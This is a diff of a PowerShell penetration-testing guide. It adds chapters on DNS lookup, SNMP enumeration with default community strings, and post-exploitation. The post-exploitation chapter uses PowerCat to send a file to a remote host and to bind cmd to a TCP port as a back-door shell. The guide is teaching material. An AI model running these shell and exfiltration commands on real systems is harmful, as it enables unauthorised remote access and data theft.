@@ -578,7 +578,7 @@ Status       Local     Remote                    Network
 OK           X:        \\Server01\Scripts        Microsoft Windows Network
 ```
 
-## Chapter 9 - Active Directory (AD)
+## Chapter 9 - Active Directory and LDAP
 
 PowerShell comes with a series of tools that support access-to, and manipulation-of, Active Directory. We can start by profiling the local machine and identifying Active Directory Information.
 
@@ -802,36 +802,118 @@ PS C:\>  Clear-ADAccountExpiration -Identity "CN=John Smith,OU=PenTesters,DC=sno
 
 ## Chapter 10 - SQL Database
 
+On the Internet the following is a list of most common databases to be found.
+
+* MySQL
+* PostgreSQL
+* Microsoft SQL
+
 ```powershell
 PS C:\> Execute-Command-MSSQL
 ```
 
 ## Chapter 11 - Domain Name System (DNS)
 
+The Domain Name System (DNS) allows us to map a name to an IP address. In the following we will use a simple function to query a fully qualified name (FQDN).
 ```powershell
-PS C:\> Test-DNSRecord
+PS C:\>  [System.Net.Dns]::GetHostEntry("www.google.com")
+
+HostName       Aliases AddressList
+--------       ------- -----------
+www.google.com {}      {142.250.200.4}
 ```
 
+We can also use it to query a host my is local name.
+
 ```powershell
-PS C:\> Resolve-DNSName
+PS C:\>  [System.Net.Dns]::GetHostEntry("DESKTOP-4LDHIQB")
+
+HostName        Aliases AddressList
+--------        ------- -----------
+DESKTOP-4LDHIQB {}      {fe80::c430:acb4:231e:15c5%5, fe80::d5b8:5025:b43e:cdd1%8, 172.16.24.175, 192.168.2.110}
 ```
 
 ## Chapter 12 - Simple Network Management Protocol (SNMP)
 
+The Simple Network Management Protocol (SNMP) is a UDP based protocol design to allow for networked devices to be configured and managed. A SNMPP server will run on UDP port 161. In the following example we will use SNMP to query a machines hostname. We will create a SNMP object and then connect to 192.168.2.187 (snmp.snowcapcyber.co.uk) using the key 'public as the authentication string.
+
+```powershell
+PS C:\> $SNMPClient = New-Object -ComObject olePrn.OleSNMP
+PS C:\> $SNMPClient.open('192.168.2.187','public',2,1000)
+PS C:\> $SNMPResults = $SNMPClient.get('.1.3.6.1.2.1.1.5.0')
+PS C:\> $SNMPClient.Close()
+PS C:\> $$SNMPResults
+
+snmp.snowcapcyber.co.uk
+```
+
+Because SNMP stores data as a tree structure we can query the SNMP database and dump the contents of a the SNMP tree.
+
+```powershell
+PS C:\> $SNMPClient = New-Object -ComObject olePrn.OleSNMP
+PS C:\> $SNMPClient.open('127.0.0.1','MYSNMPCOMMUNITY',2,1000)
+PS C:\> $SNMPDATA=$SNMPClient.GetTree(".1.3.6.1.2.1.2.2.1.2")
+PS C:\> $RESULT=@()
+PS C:\> for($i=0;$i-lt $SNMPDATA.length/2;$i++){$RESULT+=[pscustomobject]@{"SNMP ID"=$SNMPDATA[0,$i];"SNMP Value"=$SNMPDATA[1,$i];OID=($snmp.OIDFromString(($SNMPDATA[0,$i])) -join ".")} }
+PS C:\> $RESULT | ft -AutoSize | out-string -width 4096
+
+SNMP ID                               SNMP Value                                                                  OID                   
+-------                               ----------                                                                  ---                   
+interfaces.ifTable.ifEntry.ifDescr.1  Software Loopback Interface 1                                               1.3.6.1.2.1.2.2.1.2.1
+interfaces.ifTable.ifEntry.ifDescr.2  WAN Miniport (L2TP)                                                         1.3.6.1.2.1.2.2.1.2.2
+interfaces.ifTable.ifEntry.ifDescr.3  WAN Miniport (SSTP)                                                         1.3.6.1.2.1.2.2.1.2.3
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .. . . . . . . . . . . . . . . . . . . . . . .
+interfaces.ifTable.ifEntry.ifDescr.9  WAN Miniport (Network Monitor)                                              1.3.6.1.2.1.2.2.1.2.9
+interfaces.ifTable.ifEntry.ifDescr.10 Microsoft Kernel Debug Network Adapter                                      1.3.6.1.2.1.2.2.1.2.10
+interfaces.ifTable.ifEntry.ifDescr.11 RAS Async Adapter                                                           1.3.6.1.2.1.2.2.1.2.11
+interfaces.ifTable.ifEntry.ifDescr.12 AWS PV Network Device #0                                                    1.3.6.1.2.1.2.2.1.2.12
+interfaces.ifTable.ifEntry.ifDescr.13 Intel(R) 82599 Virtual Function                                             
+```
+
+There are a number of PowerShell modules that support SNMP. One such module is:
+
+* Proxx.SNMP
+
+We can installl and explore this module as follows. This module supports two functions. The first function is to get an element of the SNMP tree and the second is the function to walk an SNMP tree.
+
+```powershell
+PS C:\>  install-module -Name Proxx.SNMP
+
+PS C:\> get-command -module Proxx.SNMP
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Cmdlet          Invoke-SnmpGet                                     1.1.1.6    Proxx.SNMP
+Cmdlet          Invoke-SnmpWalk                                    1.1.1.6    Proxx.SNMP
+
+PS C:\>
+```
+
+## Chapter 13 - Email Services (SMTP, POP and IMAP)
+
 ```powershell
 PS C:\>
 ```
 
-## Chapter 13 - Azure
+## Chapter 14 - Azure
 
 ```powershell
 PS C:\>
 ```
-## Chapter 14 - AWS
+
+## Chapter 15 - AWS
 
 ```powershell
 PS C:\>
 ```
+
+
+## Chapter 16 - Other Services
+
+```powershell
+PS C:\>
+```
+
 ## Chapter 17 - Brute Forcing
 
 Once we have identified a series of TCP services that support authentication then we cab start to Brute force a connection to them. To do this we will make use of the following tools.
@@ -842,7 +924,7 @@ Once we have identified a series of TCP services that support authentication the
 PS C:\>
 ```
 
-## Chapter 16 - User Profiling
+## Chapter 18 - User Profiling
 
 Once we have exploited a system we start to profile a system using a set of PowerShell commands. We can start be listing the users on the target system.
 ```powershell
@@ -944,7 +1026,7 @@ User        WIN11\Administrator  Local
 User        WIN11\jsmith         Local
 ```
 
-## Chapter 17 - Profiling Local/Remote Systems
+## Chapter 19 - Profiling Local/Remote Systems
 
 Profiling the target system starts with us profiling the execution policy. The Execution policy defines how, when and where PowerShell Scripts can be executed. To identify the execution policy we can use the Get-ExecutionPolicy PowerShell command.
 ```powershell
@@ -1143,21 +1225,26 @@ We can also the Invoke-Command command to execute a remote commands on a target 
 PS C:\> Invoke-Command -ComputerName dc03.snowcapcyber.co.uk -ScriptBlock { Get-HotFix }
 ```
 
-We can also use PowerShell to create a back door to the target system.
+## Chapter 20 - Post Exploitation
+
+There are a number of tools we can use to post exploitation to help us establish some form of command and control. We can use PowerShell to create a back door to the target system.
 
 * [PowerCat](https://github.com/besimorhino/powercat)
 
 The [PowerCat](https://github.com/besimorhino/powercat) tool allows us to send and receive data as well as bind a shell to a TCP port. By default, [PowerCat](https://github.com/besimorhino/powercat) reads input from the console and writes input to the console using write-host. In the following we will use [PowerCat](https://github.com/besimorhino/powercat) to receive some data.
+
 ```powershell
 PS C:\> powercat -l -p 8000 -of C:\inputfile
 ```
 
 In the following we will use [PowerCat](https://github.com/besimorhino/powercat) to send some data to the target 10.1.1.1
+
 ```powershell
 PS C:\> powercat -c 10.1.1.1 -p 443 -i C:\inputfile
 ```
 
 We can also use [PowerCat](https://github.com/besimorhino/powercat) to bind a TCP port to shell.
+
 ```powershell
 PS C:\> powercat -l -p 443 -e cmd
 ```
